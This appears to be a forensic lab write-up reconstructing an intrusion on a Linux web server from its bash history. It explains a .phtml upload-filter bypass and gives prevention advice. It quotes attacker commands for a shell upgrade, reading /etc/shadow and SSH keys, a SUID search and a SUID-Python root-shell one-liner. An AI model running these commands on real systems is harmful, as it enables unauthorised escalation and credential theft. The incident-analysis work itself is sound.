# Linux Server Logs

This exercise provides a bash history log from a compromised Linux web server. The server enforced input sanitization intended to block malicious `.php` uploads, yet data from it was later found for sale. The task is to reconstruct the activity from the history and explain how that control was defeated.

Analysis was done in an isolated Kali Linux VM on KVM, reverted to a clean snapshot with the network link disabled before the archive was extracted. The history was read as plain text and nothing in it was executed. No files were fetched or run; the commands below are the attacker's, read from the log, not commands reproduced during analysis.

## The Upload Filter Bypass

The clearest artifact is the final line, where a file is removed from the web server's upload directory.

```bash
rm /var/www/html/uploads/x.phtml
```

The file is `x.phtml`, not `x.php`. The sanitization described in the task rejects `.php`, but a `.phtml` file placed in a writable upload directory is a well-known way around a filter that only matches the literal `.php` string, because `.phtml` is commonly mapped to the PHP interpreter by the web server's handler configuration. The log does not name the web server or show the file's contents, so its role as an executing webshell is the analytical conclusion the evidence points to, not something the history proves directly. What the log does establish is that a non-`.php` file existed in the upload directory and was deleted at the end of the session. That extension gap is the bypass in question.

## Interactive Shell and Local Enumeration

The history includes the standard technique for turning limited code execution into a usable terminal, which is cataloged on GTFOBins.

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

A long enumeration phase follows: locating interpreters and compilers, reading account, sudo, network and SSH-key files, and downloading linux-exploit-suggester to look for escalation paths.

```bash
find / -name perl* ; find / -name python* ; find / -name gcc*
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
cat /etc/passwd
cat /etc/sudoers
cat ~/.ssh/authorized_keys
```

## Privilege Escalation Attempts

Two separate routes to root appear. An early `su root` near the start of the session and, much later, a SUID search followed by the GTFOBins SUID-Python one-liner.

```bash
cat /etc/shadow
find / -type f -user root -perm -4000 2>/dev/null
./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

The `-p` flag preserves privileges and only has an effect if the interpreter is SUID-root, so the operator was clearly targeting a SUID Python. The log neither shows Python's permissions nor any command output, so whether Python was actually SUID, and whether either escalation succeeded, cannot be confirmed from this history alone. The read of `/etc/shadow` is entered before the SUID-Python line, not after it, so it cannot be treated as confirmation that the escalation worked. It is an attempt whose result the log does not record.

No exfiltration command appears in the history. The task states the data was sold, but the mechanism by which it left the host is not present in this evidence.

## Root Cause

The failure is a single, narrow control with nothing behind it. The sanitization matched one file extension while the web server treated other extensions as executable PHP, and the host appears to have offered a SUID interpreter as a local escalation path. A denylist on one attribute, at one layer, with no restriction on interpreter execution or SUID binaries beneath it.

## Indicators and Artifacts

| Type | Value | Role |
|---|---|---|
| File | `/var/www/html/uploads/x.phtml` | Uploaded file bypassing the `.php` filter, deleted at session end |
| Tool | linux-exploit-suggester (`les.sh`) | Downloaded to enumerate kernel/privesc paths |
| Technique | `pty.spawn("/bin/sh")` | GTFOBins interactive shell upgrade |
| Technique | SUID-Python `os.execl("/bin/sh","sh","-p")` | GTFOBins SUID escalation attempt, outcome unconfirmed |
| File read | `/etc/passwd`, `/etc/sudoers`, `/etc/shadow`, `~/.ssh/authorized_keys` | Local account and key enumeration |

## Takeaways

The whole intrusion is reconstructable from shell history alone, and the artifacts point at controls that are cheap to monitor:

- A file with a PHP-executable extension other than `.php` landing in an upload directory is the bypass in one line. File integrity monitoring on the upload path would flag the write and the later delete.
- A web or system user spawning an interactive shell with `pty.spawn` and then running SUID searches is a strong host-based escalation signal. Command auditing (auditd or an EDR agent) captures it.
- An outbound fetch of linux-exploit-suggester from a web server is anomalous egress. That server has no reason to pull scripts from GitHub, and egress filtering or proxy logging would catch it.

For prevention: allowlist permitted upload extensions rather than denylisting `.php`, and validate file content by signature rather than filename; confirm the web server does not map `.phtml`, `.php3`, `.php4`, `.php5`, `.phar`, or `.pht` to the PHP interpreter; store uploads outside the web root or serve the upload directory with script execution disabled; audit SUID-root binaries against least privilege and remove the bit from interpreters such as Python; apply egress filtering to block outbound fetches like the exploit-suggester download.